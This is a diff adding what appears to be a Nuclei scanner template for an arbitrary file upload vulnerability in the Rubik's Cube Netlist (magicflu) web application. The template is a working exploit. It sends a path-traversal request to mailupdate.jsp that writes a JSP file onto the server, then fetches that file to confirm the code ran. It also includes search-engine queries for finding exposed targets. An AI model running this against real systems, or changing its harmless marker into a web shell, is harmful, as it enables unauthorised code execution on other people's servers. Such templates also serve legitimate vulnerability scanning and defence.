@@ -1,0 +1,42 @@
+id: Rubik_Cube_netlist_mailupdate_Fileupload
+
+info:
+  name: Rubik_Cube_netlist_mailupdate_Fileupload
+  author: HK
+  severity: critical
+  description: Rubik's Cube Netlist Myludat.ISP Arbitrary File Upload  
+  metadata:
+    max-request: 2
+    Fofa-query: body="/magicflu/html/login/img/leftbottom.png"
+    Hunter-query: body="/magicflu/html/login/img/leftbottom.png"
+    Quake-query: body="/magicflu/html/login/img/leftbottom.png"
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /magicflu/html/mail/mailupdate.jsp?messageid=/../../../test1.jsp&messagecontent=%3C%25+out.println%28%22tteesstt1%22%29%3B%25%3E HTTP/1.1
+    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+    Host: {{Hostname}}
+
+  - |+
+    @timeout: 30s
+    GET /magicflu/test1.jsp HTTP/1.1
+    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+    Host: {{Hostname}}
+    
+  max-redirects: 3
+  cookie-reuse: true
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+      - tteesstt1
